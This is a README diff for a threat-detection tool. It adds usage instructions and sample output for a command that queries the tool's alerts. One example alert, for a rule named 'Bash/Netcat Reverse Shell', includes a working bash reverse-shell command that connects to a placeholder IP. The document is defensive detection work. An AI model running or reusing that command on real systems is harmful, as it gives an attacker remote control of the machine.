@@ -203,6 +203,103 @@ Options:
   --verbose             Show detailed output
 ```
 
+### Alert Query Tool
+
+After generating alerts with `demo_detector.py`, use `query_alerts.py` to search, filter, and analyze them from the database.
+
+```bash
+# Show alerts from last 24 hours
+python query_alerts.py --last 24h
+
+# Show critical alerts in table format
+python query_alerts.py --severity critical
+
+# Show Windows alerts with high scores
+python query_alerts.py --platform windows --min-score 100
+
+# Export alerts to JSON
+python query_alerts.py --last 7d --format json > alerts.json
+
+# Export alerts to CSV file
+python query_alerts.py --last 30d --format csv > alerts.csv
+
+# Show alerts for specific rule
+python query_alerts.py --rule-id LNX-002
+
+# Verbose output with full details
+python query_alerts.py --last 24h --verbose
+
+# Combine multiple filters
+python query_alerts.py --severity high --platform linux --last 48h --limit 20
+```
+
+#### Query Options
+
+**Filters:**
+- `--severity {critical,high,medium,low}` - Filter by severity level
+- `--platform {windows,linux}` - Filter by platform
+- `--min-score N` - Minimum alert score (0-150)
+- `--last TIMEFRAME` - Show alerts from last N time (e.g., 24h, 7d, 4w, 3m)
+- `--rule-id RULE_ID` - Filter by specific rule ID (e.g., WIN-001, LNX-002)
+- `--limit N` - Maximum number of results (default: 50, 0 for unlimited)
+
+**Output Formats:**
+- `--format table` - Colored table with severity highlighting (default)
+- `--format json` - JSON output for programmatic processing
+- `--format csv` - CSV output for spreadsheet analysis
+
+**Display Options:**
+- `--verbose` - Show detailed information including command lines and MITRE techniques
+- `--no-summary` - Skip summary statistics
+
+#### Example Output
+
+**Table Format:**
+```
+ID     Timestamp            Severity   Score  Rule ID    Platform   Process
+------------------------------------------------------------------------------------------------------------------------
+1      2025-01-15 14:30:00  HIGH       115    LNX-002    linux      bash
+2      2025-01-15 14:25:00  CRITICAL   140    LNX-002    linux      bash
+
+SUMMARY STATISTICS
+============================================================
+
+Total Alerts: 2
+
+Breakdown by Severity:
+  Critical  :    1 ( 50.0%)
+  High      :    1 ( 50.0%)
+
+Breakdown by Platform:
+  Linux     :    2 (100.0%)
+
+Score Statistics:
+  Average: 127.5/150
+  Maximum: 140/150
+  Minimum: 115/150
+
+Top 5 Triggered Rules:
+  LNX-002: Bash/Netcat Reverse Shell                    :    2 (100.0%)
+```
+
+**JSON Format:**
+```json
+[
+  {
+    "id": 1,
+    "timestamp": "2025-01-15T14:30:00.123456",
+    "severity": "high",
+    "score": 115,
+    "rule_id": "LNX-002",
+    "rule_name": "Bash/Netcat Reverse Shell",
+    "platform": "linux",
+    "process_name": "bash",
+    "command_line": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
+    "mitre_attack": "T1059.004, T1071.001"
+  }
+]
+```
+
 ### Web Dashboard
 
 Start the REST API server and access the web dashboard:
